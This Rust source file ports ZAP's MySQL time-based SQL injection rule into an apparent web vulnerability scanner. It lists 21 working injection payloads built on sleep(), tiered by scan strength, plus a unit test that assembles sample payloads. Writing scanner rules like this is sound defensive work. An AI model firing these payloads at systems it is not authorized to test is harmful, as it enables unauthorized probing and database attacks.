//! Ported from ZAP SqlInjectionMySqlTimingScanRule (ascanrules, Apache License 2.0).

use super::common::{SQL_DESC, SQL_REFS, SQL_SOLN, SQL_TIMING_TAGS};
use super::timing::{scan_sql_timing, SqlTiming};
use crate::scan::active::{ActiveRule, BoxFuture, Cx, RuleScope};
use crate::scan::{AlertDef, Confidence, Risk};

static ALERT: AlertDef = AlertDef {
    alert_ref: "40019",
    name: "SQL Injection - MySQL (Time Based)",
    risk: Risk::High,
    confidence: Confidence::Medium,
    cwe: 89,
    wasc: 19,
    description: SQL_DESC,
    solution: SQL_SOLN,
    references: SQL_REFS,
    tags: SQL_TIMING_TAGS,
};

static ALERTS: [&AlertDef; 1] = [&ALERT];

/// MySQL >= 5.0.12 sleep payloads, in ZAP's order (LOW: the first 6, MEDIUM: 10,
/// HIGH: 12, INSANE: all).
pub(super) const TEMPLATES: [&str; 21] = [
    // Without a comment: the field in the SELECT clause, but also in WHERE clauses.
    concat!(orig_value!(), " / sleep(", sleep_token!(), ") "),
    concat!(orig_value!(), "' / sleep(", sleep_token!(), ") / '"),
    concat!(orig_value!(), "\" / sleep(", sleep_token!(), ") / \""),
    // Param in WHERE clause.
    concat!(orig_value!(), " and 0 in (select sleep(", sleep_token!(), ") ) -- "),
    concat!(orig_value!(), "' and 0 in (select sleep(", sleep_token!(), ") ) -- "),
    concat!(orig_value!(), "\" and 0 in (select sleep(", sleep_token!(), ") ) -- "),
    // Param in SELECT/UPDATE/DELETE clause.
    concat!(orig_value!(), " where 0 in (select sleep(", sleep_token!(), ") ) -- "),
    concat!(orig_value!(), "' where 0 in (select sleep(", sleep_token!(), ") ) -- "),
    concat!(orig_value!(), "\" where 0 in (select sleep(", sleep_token!(), ") ) -- "),
    // Param in WHERE clause.
    concat!(orig_value!(), " or 0 in (select sleep(", sleep_token!(), ") ) -- "),
    concat!(orig_value!(), "' or 0 in (select sleep(", sleep_token!(), ") ) -- "),
    concat!(orig_value!(), "\" or 0 in (select sleep(", sleep_token!(), ") ) -- "),
    // Without comments.
    concat!(orig_value!(), " where 0 in (select sleep(", sleep_token!(), ") ) "),
    concat!(orig_value!(), "' where 0 in (select sleep(", sleep_token!(), ") ) and ''='"),
    concat!(orig_value!(), "\" where 0 in (select sleep(", sleep_token!(), ") ) and \"\"=\""),
    concat!(orig_value!(), " and 0 in (select sleep(", sleep_token!(), ") ) "),
    concat!(orig_value!(), "' and 0 in (select sleep(", sleep_token!(), ") ) and ''='"),
    concat!(orig_value!(), "\" and 0 in (select sleep(", sleep_token!(), ") ) and \"\"=\""),
    concat!(orig_value!(), " or 0 in (select sleep(", sleep_token!(), ") ) "),
    concat!(orig_value!(), "' or 0 in (select sleep(", sleep_token!(), ") ) and ''='"),
    concat!(orig_value!(), "\" or 0 in (select sleep(", sleep_token!(), ") ) and \"\"=\""),
];

/// `(int) x`: whole seconds.
fn sleep_token(x: f64) -> String {
    (x as i64).to_string()
}

static SPEC: SqlTiming = SqlTiming {
    alert: &ALERT,
    templates: &TEMPLATES,
    limits: [6, 10, 12, TEMPLATES.len()],
    sleep_token,
    attack_sleep: None,
};

pub struct SqlInjectionMySqlTiming;

impl ActiveRule for SqlInjectionMySqlTiming {
    fn id(&self) -> u32 {
        40019
    }

    fn name(&self) -> &'static str {
        "SQL Injection - MySQL (Time Based)"
    }

    fn alerts(&self) -> &'static [&'static AlertDef] {
        &ALERTS
    }

    fn scope(&self) -> RuleScope {
        RuleScope::Param
    }

    fn scan<'a>(&'a self, cx: &'a Cx) -> BoxFuture<'a> {
        Box::pin(scan_sql_timing(cx, &SPEC))
    }
}

#[cfg(test)]
mod tests {
    use super::super::timing::assemble;
    use super::*;

    #[test]
    fn payloads() {
        assert_eq!(assemble(TEMPLATES[1], "test", &sleep_token(5.0)), "test' / sleep(5) / '");
        assert_eq!(assemble(TEMPLATES[3], "1", &sleep_token(1.0)), "1 and 0 in (select sleep(1) ) -- ");
        assert_eq!(assemble(TEMPLATES[20], "a", "5"), "a\" or 0 in (select sleep(5) ) and \"\"=\"");
        assert_eq!(SPEC.limits, [6, 10, 12, 21]);
    }
}
